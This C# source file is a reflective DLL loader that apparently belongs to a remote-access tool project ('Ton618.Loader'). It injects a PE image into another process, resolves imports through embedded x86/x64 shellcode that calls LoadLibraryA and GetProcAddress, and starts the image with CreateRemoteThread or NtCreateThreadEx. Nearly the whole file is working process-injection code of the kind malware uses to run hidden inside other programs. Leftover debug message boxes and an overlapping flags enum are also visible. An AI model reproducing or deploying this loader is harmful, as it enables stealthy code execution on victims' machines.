using Q3C273.Shared;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Ton618.Utilities;
using Ton618.Utilities.PE;
using static Ton618.Utilities.ClientNatives;

namespace Ton618.Loader
{
    internal class DllLoader
    {
        private readonly byte[] imageBytes;
        private PEImage pe;

        public DllLoader(byte[] image)
        {
            imageBytes = image;
            pe = PEImage.ReadFromMemory(image, IntPtr.Zero, image.Length);
            if (pe == null)
                throw new InvalidOperationException("PE image failed to parse"); // TODO: Handle this
        }

        public ReflectiveSpecific Check(IntPtr processHandle)
        {
            var specifics = ReflectiveSpecific.None;
            if (!pe.DllCharacteristics.HasFlag(DllCharacteristicsType.IMAGE_DLLCHARACTERISTICS_NX_COMPAT))
                specifics |= ReflectiveSpecific.NOT_NX_COMPAT;
            if (!IsWow64Process(processHandle, out var x86) // Failed to get target process bits
                || pe.Is64Bitness == x86 // My DLL is 64-bit and the target process is 32-bit (or vice versa)
                || (IntPtr.Size == 4) == pe.Is64Bitness // Current process is 32-bit and My DLL is 64-bit (or vice versa)
                || (IntPtr.Size == 4) != x86) // Current process is 32-bit and the target process is 64-bit (or vice versa)
                specifics |= ReflectiveSpecific.INCOMPATIBLE_BITS;
            if (!pe.DllCharacteristics.HasFlag(DllCharacteristicsType.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE))
                specifics |= ReflectiveSpecific.NOT_ASLR_COMPAT;

            return specifics;
        }

        public IntPtr GetProcAddr(IntPtr peHandle, string funcName)
        {
            if (pe.ExportDirectory.Size == 0)
                return IntPtr.Zero;
            var i32size = (uint)Marshal.SizeOf<uint>();
            var i16size = (uint)Marshal.SizeOf<ushort>();

            var edtPtr = peHandle.uplusptr(pe.ExportDirectory.VirtualAddress);
            var edt = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(edtPtr);

            for (uint i = 0, j = edt.NumberOfNames; i < j; i++)
            {
                var nameOffsetPtr = peHandle.uplusptr(edt.AddressOfNames + (i * i32size));
                var namePtr = peHandle.uplusptr(Marshal.PtrToStructure<uint>(nameOffsetPtr));
                var name = Marshal.PtrToStringAnsi(namePtr);

                if (name.Equals(funcName, StringComparison.OrdinalIgnoreCase))
                {
                    var ordinalPtr = peHandle.uplusptr(edt.AddressOfNameOrdinals + (i * i16size));
                    var ordinal = Marshal.PtrToStructure<ushort>(ordinalPtr);
                    var addrPtr = peHandle.uplusptr(edt.AddressOfFunctions + (ordinal * i32size));
                    var addr = Marshal.PtrToStructure<uint>(addrPtr);
                    return peHandle.uplusptr(addr);
                }
            }

            return IntPtr.Zero;
        }

        public (IntPtr localAddress, IntPtr remoteAddress) Inject(IntPtr processHandle)
        {
            var ptrSize = Marshal.SizeOf<IntPtr>();

            var specifics = Check(processHandle);
            if (specifics.HasFlag(ReflectiveSpecific.INCOMPATIBLE_BITS))
                throw new Exception("Processor bits mismatch");

            var remoteMemAddr = IntPtr.Zero;
            if (specifics.HasFlag(ReflectiveSpecific.NOT_ASLR_COMPAT))
                remoteMemAddr = (IntPtr)pe.OriginalImageBase;

            var localMem = VirtualAlloc(
                IntPtr.Zero,
                (UIntPtr)pe.SizeOfImage,
                AllocationType.COMMIT | AllocationType.RESERVE,
                PageAccessRights.PAGE_READWRITE);

            var remoteMem = VirtualAllocEx(
                processHandle,
                remoteMemAddr,
                (UIntPtr)pe.SizeOfImage,
                AllocationType.COMMIT | AllocationType.RESERVE,
                PageAccessRights.PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero)
                throw new Exception("Remote PE memory allocation failure");

            // Copy headers (they're always consistent and only contains 'relative' addresses thus we don't need to touch them)
            Marshal.Copy(imageBytes, 0, localMem, (int)pe.SizeOfHeader);

            CopySections(localMem);

            UpdateMemoryAddresses(localMem, remoteMem, pe.OriginalImageBase);

            ImportDllImports(localMem, remoteMem, processHandle);
            MessageBox.Show("[DBG_DBG_DBG_DBG] After imports: " + GetLastError());

            if (!specifics.HasFlag(ReflectiveSpecific.NOT_NX_COMPAT))
                UpdateMemoryProtectionFlags(localMem, remoteMem, processHandle);
            MessageBox.Show("[DBG_DBG_DBG_DBG] After mem prot update: " + GetLastError());

            var written = UIntPtr.Zero;
            var state = WriteProcessMemory(processHandle, remoteMem, localMem, (UIntPtr)pe.SizeOfImage, ref written);
            if (!state)
                throw new Exception("Cannot write PE to remote process.");

            // call dllmain
            var dllmain = remoteMem.uplusptr(pe.EntryPoint);
            byte[][] shellCode;
            if (pe.Is64Bitness)
            {
                shellCode = new byte[][]
                {
                    new byte[] {0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9 },
                    new byte[] {0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8 },
                    new byte[] {0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }
            else
            {
                shellCode = new byte[][]
                {
                     new byte[] {0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9 },
                     new byte[] {0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8 },
                     new byte[] {0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }
            var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 2;
            var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
            var shellCodeMemOriginal = shellCodeMem;

            shellCodeMem.WriteBytes(shellCode[0]);
            shellCodeMem += shellCode[0].Length;

            Marshal.StructureToPtr(remoteMem, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[1]);
            shellCodeMem += shellCode[1].Length;

            Marshal.StructureToPtr(dllmain, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[2]);
            shellCodeMem += shellCode[2].Length;

            var shellCodeRMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
            if (shellCodeRMem == IntPtr.Zero)
                throw new Exception("Cannot allocate remote process memory for DllMain invocation.");
            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref written);
            if (!state || written != (UIntPtr)shellCodeSize)
                throw new Exception("DllMain shellcode is not fully written to the target process memory.");

            var threadHandle = CreateRemoteThreadAuto(processHandle, shellCodeRMem, IntPtr.Zero);
            if (threadHandle == IntPtr.Zero)
                throw new Exception("Cannot create remote DllMain invoker thread");
            MessageBox.Show("[DBG_DBG_DBG_DBG] After thread creation: " + GetLastError());

            VirtualFreeEx(processHandle, shellCodeRMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);

            return (localMem, remoteMem);
        }

        // Copy-Sections
        private void CopySections(IntPtr localStartAddress)
        {
            foreach (var section in pe.EnumerateSections())
            {
                var dest = localStartAddress.uplusptr(section.VirtualAddress);
                var data = section.PointerToRawData;
                var rawSize = section.SizeOfRawData;
                if (data == 0)
                    rawSize = 0;

                var vsize = section.PhysicalAddressOrVirtualSize;
                if (rawSize > vsize)
                    rawSize = vsize;

                Marshal.Copy(imageBytes, (int)data, dest, (int)rawSize);

                if (rawSize < vsize)
                {
                    // Fill extra space with zero
                    SharedNatives.memset(dest.uplusptr(rawSize), 0, (uint)(vsize - rawSize));
                }
            }
        }

        // Update-MemoryAddresses
        private void UpdateMemoryAddresses(IntPtr localMem, IntPtr remoteMem, ulong originalBase)
        {
            if (originalBase == remoteMem.ToUInt64() || pe.BaseRelocationDirectory.Size == 0)
                return; // Nothing to do

            var imageBaseRelocSize = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
            var baseDifference = 0ul;
            var addDifference = true;
            if (originalBase > remoteMem.ToUInt64())
            {
                baseDifference = originalBase - remoteMem.ToUInt64();
                addDifference = false;
            }
            else
                baseDifference = remoteMem.ToUInt64() - originalBase;
            IntPtr baseRelocPtr = localMem.uplusptr(pe.BaseRelocationDirectory.VirtualAddress);
            var tableSize = pe.BaseRelocationDirectory.Size;
            while (tableSize > 0)
            {
                var baseRelocationTable = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(baseRelocPtr);
                if (baseRelocationTable.SizeOfBlock == 0)
                    break;

                var memAddrBase = localMem.uplusptr(baseRelocationTable.VirtualAddress);
                var numRelocations = (baseRelocationTable.SizeOfBlock - imageBaseRelocSize) / 2;
                for (int i = 0; i < numRelocations; i++)
                {
                    var relocationInfoPtr = baseRelocPtr + imageBaseRelocSize + (2 * i);
                    var relocationInfo = Marshal.PtrToStructure<ushort>(relocationInfoPtr);
                    var relocOffset = relocationInfo & 0x0FFFu;
                    var relocType = (ImageRelocationType)(((relocationInfo & 0xF000u) >> 12) & 0xFu);
                    if (relocType == ImageRelocationType.IMAGE_REL_BASED_HIGHLOW | relocType == ImageRelocationType.IMAGE_REL_BASED_DIR64) // TODO: Support IMAGE_REL_BASED_HIGH IMAGE_REL_BASED_LOW
                    {
                        var finalAddr = memAddrBase.uplusptr(relocOffset);
                        var currAddr = Marshal.PtrToStructure<IntPtr>(finalAddr);
                        if (addDifference)
                            currAddr = currAddr.uplusptr(baseDifference);
                        else
                            currAddr = currAddr.uminusptr(baseDifference);
                        Marshal.StructureToPtr(currAddr, finalAddr, false);
                    }
                    else if (relocType != ImageRelocationType.IMAGE_REL_BASED_ABSOLUTE)
                        throw new Exception($"Unknown relocation: {relocType:X} at relocationInfo: {relocationInfo:X}");
                }
                tableSize -= baseRelocationTable.SizeOfBlock; // Extra overflow protection layer
                baseRelocPtr = baseRelocPtr.uplusptr(baseRelocationTable.SizeOfBlock);
            }
        }

        // Import-DllImports
        private void ImportDllImports(IntPtr localMem, IntPtr remoteMem, IntPtr processHandle)
        {
            if (pe.ImportDescriptorTable.Size == 0)
                return;

            var importDescriptorPtr = localMem.uplusptr(pe.ImportDescriptorTable.VirtualAddress);
            while (true)
            {
                var importDescriptor = Marshal.PtrToStructure<IMAGE_IMPORT_DESCRIPTOR>(importDescriptorPtr);
                if (importDescriptor.Characteristics == 0 && importDescriptor.ForwarderChain == 0 && importDescriptor.Name == 0 && importDescriptor.TimeDateStamp == 0)
                    break; // Null-terminating IDT

                var importDllPathPtr = localMem.uplusptr(importDescriptor.Name);

                var importDllHandle = ImportDllInRemoteProcess(processHandle, importDllPathPtr);
                if (importDllHandle == null || importDllHandle == IntPtr.Zero)
                    throw new Exception("Import dll failed: " + Marshal.PtrToStringAnsi(importDllPathPtr) + " win32 error " + ClientNatives.GetLastError());

                var thunkRef = localMem.uplusptr(importDescriptor.FirstThunk);
                var originalThunkRef = localMem.uplusptr(importDescriptor.Characteristics); //Characteristics is overloaded with OriginalFirstThunk
                var originalThunkRefVal = Marshal.PtrToStructure<IntPtr>(originalThunkRef);

                while (originalThunkRefVal != IntPtr.Zero)
                {
                    var byOrdinal = IntPtr.Size == 4 && originalThunkRefVal.ToInt32() < 0 || IntPtr.Size == 8 && originalThunkRefVal.ToInt64() < 0;
                    var procNamePtr = IntPtr.Zero;
                    var newThunkRef = IntPtr.Zero;
                    string procName = "";
                    if (!byOrdinal)
                    {
                        var stringAddr = new IntPtr(localMem.ToInt64() + originalThunkRefVal.ToInt64()) + Marshal.SizeOf<ushort>();
                        procName = Marshal.PtrToStringAnsi(stringAddr);
                        procNamePtr = Marshal.StringToHGlobalAnsi(procName);
                    }

                    newThunkRef = RemoteProcAddress(processHandle, importDllHandle, procNamePtr, byOrdinal);
                    if (newThunkRef == null || newThunkRef == IntPtr.Zero)
                    {
                        if (byOrdinal)
                            throw new Exception("New function ref null ptr=" + procNamePtr + " dll=" + Marshal.PtrToStringAnsi(importDllPathPtr));
                        else
                            throw new Exception("New function ref null name=" + procName + " dll=" + Marshal.PtrToStringAnsi(importDllPathPtr));
                    }

                    Marshal.StructureToPtr(newThunkRef, thunkRef, false);
                    thunkRef += Marshal.SizeOf<IntPtr>();
                    originalThunkRef += Marshal.SizeOf<IntPtr>();
                    originalThunkRefVal = Marshal.PtrToStructure<IntPtr>(originalThunkRef);

                    if (!byOrdinal && procNamePtr != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(procNamePtr);
                        procNamePtr = IntPtr.Zero;
                    }
                }

                importDescriptorPtr += Marshal.SizeOf<IMAGE_IMPORT_DESCRIPTOR>();
            }
        }

        private void UpdateMemoryProtectionFlags(IntPtr localMem, IntPtr remoteMem, IntPtr processHandle)
        {
            foreach (var section in pe.EnumerateSections())
            {
                var sectionPtr = localMem.uplusptr(section.VirtualAddress);
                var protectionFlag = GetVirtualProtectionValue(section.Characteristics);
                var sectionSize = section.PhysicalAddressOrVirtualSize;
                var state = VirtualProtect(sectionPtr, (UIntPtr)sectionSize, protectionFlag, out var oldProtection);
                if (!state)
                    throw new Exception("Cannot update memory protection rule for section " + sectionPtr);
            }
        }

        private PageAccessRights GetVirtualProtectionValue(ImageSectionCharacteristics chr)
        {
            var protFlags = PageAccessRights.None;
            if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_EXECUTE))
            {
                if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_READ))
                {
                    if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_WRITE))
                        protFlags = PageAccessRights.PAGE_EXECUTE_READWRITE;
                    else
                        protFlags = PageAccessRights.PAGE_EXECUTE_READ;
                }
                else
                {
                    if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_READ))
                        protFlags = PageAccessRights.PAGE_WRITECOPY;
                    else
                        protFlags = PageAccessRights.PAGE_EXECUTE;
                }
            }
            else
            {
                if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_READ))
                {
                    if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_WRITE))
                        protFlags = PageAccessRights.PAGE_READWRITE;
                    else
                        protFlags = PageAccessRights.PAGE_READONLY;
                }
                else
                {
                    if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_READ))
                        protFlags = PageAccessRights.PAGE_WRITECOPY;
                    else
                        protFlags = PageAccessRights.PAGE_NOACCESS;
                }
            }

            if (chr.HasFlag(ImageSectionCharacteristics.IMAGE_SCN_MEM_NOT_CACHED))
                protFlags |= PageAccessRights.PAGE_NOCACHE;

            return protFlags;
        }

        private IntPtr ImportDllInRemoteProcess(IntPtr processHandle, IntPtr importDllPathPtr)
        {
            var ptrSize = Marshal.SizeOf<IntPtr>();
            var importDllPath = Marshal.PtrToStringAnsi(importDllPathPtr);
            var dllPathSize = (UIntPtr)(importDllPath.Length + 1);
            var rimportDllPathPtr = VirtualAllocEx(processHandle, IntPtr.Zero, dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
            if (rimportDllPathPtr == IntPtr.Zero)
                throw new Exception("Unable to allocate memory in the remote process for imported DLL path: " + importDllPath);

            var numBytesWritten = UIntPtr.Zero;
            var state = WriteProcessMemory(processHandle, rimportDllPathPtr, importDllPathPtr, dllPathSize, ref numBytesWritten);
            if (!state || numBytesWritten != dllPathSize)
                throw new Exception("Unable to fully write memory in the remote process for imported DLL path: " + importDllPath);

            var loadLibraryAddr = LookupPointer("kernel32.dll", "LoadLibraryA");

            var dllAddress = IntPtr.Zero;
            if (pe.Is64Bitness)
            {
                //For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
                //Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
                var loadLibraryARetMem = VirtualAllocEx(processHandle, IntPtr.Zero, dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                if (loadLibraryARetMem == IntPtr.Zero)
                    throw new Exception("Failed to allocate LoadLibraryA return-memory Win32 Error " + GetLastError());

                // SHELLCODE BEGIN
                //Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
                var shellCode = new byte[][]
                {
                    new byte[] { 0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0xba },
                    new byte[] { 0xff, 0xd2, 0x48, 0xba },
                    new byte[] { 0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3 }
                };
                var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 3;

                var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
                var shellCodeMemOriginal = shellCodeMem;

                shellCodeMem.WriteBytes(shellCode[0]);
                shellCodeMem += shellCode[0].Length;

                Marshal.StructureToPtr(rimportDllPathPtr, shellCodeMem, false);
                shellCodeMem += ptrSize;

                shellCodeMem.WriteBytes(shellCode[1]);
                shellCodeMem += shellCode[1].Length;

                Marshal.StructureToPtr(loadLibraryAddr, shellCodeMem, false);
                shellCodeMem += ptrSize;

                shellCodeMem.WriteBytes(shellCode[2]);
                shellCodeMem += shellCode[2].Length;

                Marshal.StructureToPtr(loadLibraryARetMem, shellCodeMem, false);
                shellCodeMem += ptrSize;

                shellCodeMem.WriteBytes(shellCode[3]);
                // SHELLCODE END

                var rscAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);

                state = WriteProcessMemory(processHandle, rscAddr, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref numBytesWritten);
                if (!state || (UIntPtr)shellCodeSize != numBytesWritten)
                    throw new Exception("Failed to write LoadLibraryA shellcode to the target process memory");

                var threadHandle = CreateRemoteThreadAuto(processHandle, rscAddr, rimportDllPathPtr);
                if (WaitForSingleObject(threadHandle, 30000) != 0)
                    throw new Exception("Library loader thread didn't finished successfully. (or timeout)");

                var retValMem = Marshal.AllocHGlobal(ptrSize);
                state = ReadProcessMemory(processHandle, loadLibraryARetMem, retValMem, (UIntPtr)ptrSize, ref numBytesWritten);
                if (!state)
                    throw new Exception("Failed to read library base address after the library loader thread.");

                dllAddress = Marshal.PtrToStructure<IntPtr>(retValMem);
                VirtualFreeEx(processHandle, loadLibraryARetMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
                VirtualFreeEx(processHandle, rscAddr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);

            }
            else
            {
                var threadHandle = CreateRemoteThreadAuto(processHandle, loadLibraryAddr, rimportDllPathPtr);
                if (WaitForSingleObject(threadHandle, 30000) != 0)
                    throw new Exception("Library loader thread didn't finished successfully. (or timeout)");

                state = GetExitCodeThread(threadHandle, out var exitCode);
                if (!state || exitCode == 0)
                    throw new Exception("Failed to read library base address after the library loader thread.");

                dllAddress = (IntPtr)exitCode;
            }

            VirtualFreeEx(processHandle, rimportDllPathPtr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);

            return dllAddress;
        }

        private IntPtr CreateRemoteThreadAuto(IntPtr processHandle, IntPtr entryPoint, IntPtr paramPtr)
        {
            var threadHandle = IntPtr.Zero;

            if (Environment.OSVersion.Version > new Version(6, 0) && Environment.OSVersion.Version < new Version(6, 2)) // Windows Vista - 7
            {
                // Use NtCreateThreadEx
                var retVal = NtCreateThreadEx(ref threadHandle, 0x1FFFFF, IntPtr.Zero, processHandle, entryPoint, paramPtr, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
                if (threadHandle == IntPtr.Zero)
                    throw new Exception("NtCreateThreadEx failed: return=" + retVal + ", win32Error=" + ClientNatives.GetLastError());
            }
            else
            {
                var tid = 0u;
                threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, UIntPtr.Zero, entryPoint, paramPtr, 0, ref tid);
                if (threadHandle == IntPtr.Zero)
                    throw new Exception("CreateRemoteThread failed: win32Error=" + ClientNatives.GetLastError());
            }
            return threadHandle;
        }

        private IntPtr RemoteProcAddress(IntPtr processHandle, IntPtr dllHandle, IntPtr funcNameOrOrdinal, bool byOrdinal)
        {
            bool state;
            var ptrSize = Marshal.SizeOf<IntPtr>();
            var rfuncNamePtr = IntPtr.Zero;
            if (!byOrdinal)
            {
                var funcNameStr = Marshal.PtrToStringAnsi(funcNameOrOrdinal);
                var funcNamesize = (UIntPtr)(funcNameStr.Length + 1);
                rfuncNamePtr = VirtualAllocEx(processHandle, IntPtr.Zero, funcNamesize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                if (rfuncNamePtr == IntPtr.Zero)
                    throw new Exception("Cannot allocate function name memory.");

                var numByteWritten = UIntPtr.Zero;
                state = WriteProcessMemory(processHandle, rfuncNamePtr, funcNameOrOrdinal, funcNamesize, ref numByteWritten);
                if (!state || funcNamesize != numByteWritten)
                    throw new Exception("Cannot fully write function name to the target process memory.");
            }
            else
                rfuncNamePtr = funcNameOrOrdinal;

            var getprocaddrRetMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)ptrSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
            if (getprocaddrRetMem == IntPtr.Zero)
                throw new Exception("Cannot allocate target process memory for GetProcAddress result");

            var getprocaddr = LookupPointer("kernel32.dll", "GetProcAddress");

            byte[][] shellCode;
            if (pe.Is64Bitness)
            {

                shellCode = new byte[][] {
                    new byte[] { 0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0xba },
                    new byte[] { 0x48, 0xb8 },
                    new byte[] { 0xff, 0xd0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }
            else
            {
                shellCode = new byte[][] {
                    new byte[] { 0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8 },
                    new byte[] { 0xb9 },
                    new byte[] { 0x51, 0x50, 0xb8 },
                    new byte[] { 0xff, 0xd0, 0xb9 },
                    new byte[] { 0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }

            var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 4;
            var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
            var shellCodeMemOriginal = shellCodeMem;

            shellCodeMem.WriteBytes(shellCode[0]);
            shellCodeMem += shellCode[0].Length;

            Marshal.StructureToPtr(dllHandle, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[1]);
            shellCodeMem += shellCode[1].Length;

            Marshal.StructureToPtr(rfuncNamePtr, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[2]);
            shellCodeMem += shellCode[2].Length;

            Marshal.StructureToPtr(getprocaddr, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[3]);
            shellCodeMem += shellCode[3].Length;

            Marshal.StructureToPtr(getprocaddrRetMem, shellCodeMem, false);
            shellCodeMem += ptrSize;

            shellCodeMem.WriteBytes(shellCode[4]);
            shellCodeMem += shellCode[4].Length;

            var shellCodeRMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
            if (shellCodeRMem == IntPtr.Zero)
                throw new Exception("Cannot allocate target process memory for shellcode");

            var shellCodesWritten = UIntPtr.Zero;
            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref shellCodesWritten);
            if (!state || shellCodesWritten != (UIntPtr)shellCodeSize)
                throw new Exception("Cannot fully write the GetProcAddress shellcode to the target process.");

            var threadHandle = CreateRemoteThreadAuto(processHandle, shellCodeRMem, IntPtr.Zero);
            if (WaitForSingleObject(threadHandle, 30000) != 0)
                throw new Exception("The GetProcAddress remote thread didn't finished successfully.");

            var retBuffer = Marshal.AllocHGlobal(ptrSize);
            state = ReadProcessMemory(processHandle, getprocaddrRetMem, retBuffer, (UIntPtr)ptrSize, ref shellCodesWritten);
            if (!state)
                throw new Exception("Cannot read GetProcAddress return value from the target process memory.");

            var procAddress = Marshal.PtrToStructure<IntPtr>(retBuffer);

            VirtualFreeEx(processHandle, shellCodeRMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            VirtualFreeEx(processHandle, getprocaddrRetMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            if (!byOrdinal)
                VirtualFreeEx(processHandle, rfuncNamePtr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            Marshal.FreeHGlobal(retBuffer);

            return procAddress;
        }
    }

    [Flags]
    internal enum ReflectiveSpecific
    {
        None = 0,
        NOT_NX_COMPAT, // DLL doesn't support NX bits
        INCOMPATIBLE_BITS, // DLL and Target executable bit does not match. (ex: DLL is 64-bit, but the target process is 32-bit)
        NOT_ASLR_COMPAT, // DLL is not compatible with ASLR
    }
}
